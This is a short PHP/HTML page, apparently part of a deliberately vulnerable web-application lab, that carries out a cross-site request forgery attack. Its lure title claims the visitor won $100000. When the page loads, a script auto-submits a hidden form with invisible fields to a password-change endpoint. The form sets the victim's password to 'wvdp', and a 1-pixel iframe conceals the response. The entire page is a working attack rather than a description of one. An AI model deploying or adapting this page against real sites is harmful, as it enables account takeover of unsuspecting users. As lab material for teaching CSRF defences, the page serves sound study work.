<!DOCTYPE HTML>
<?php
include_once("../../../includes/incl_sqlcon.php"); 
?>
<html>
<head>
<title>Congratulations !! You won $100000</title>
<style>
img {
	display:block;
	margin-top: 60px;
	margin-left: auto;
	margin-right: auto;
    height: 350px; /* height of the background image */
    width: 725px; /* width of the background image */
}


  .hide { position:absolute; top:-1px; left:-1px; width:1px; height:1px; } 
</style>

<script>
function spam()
{
	document.getElementById("dataForm").submit();
}

</script>

</head>
<body bgcolor="#FF0000" onload="spam()">

<a href="prizeWinnerDetails.html"><img src="prize.jpg"></a>
<div align="center" id="registration">
	<form id="dataForm" method="POST" action="<?php echo $base_url; ?>demos/csrf/csrf_password.php" target="hiddenFrame">
		<input style="opacity:0; margin-top:50px" type="text" name="newPassword" value="wvdp"> <br>
		<input style="opacity:0" type="text" name="reenterPassword" value="wvdp"><br>
		<input name="session_token" type="hidden" value="11550705f0a04cc6.95873358">
		<input type="hidden" name="post" value="">
	</form>

    <iframe name="hiddenFrame" class="hide"></iframe>
</div>

</body>
</html>
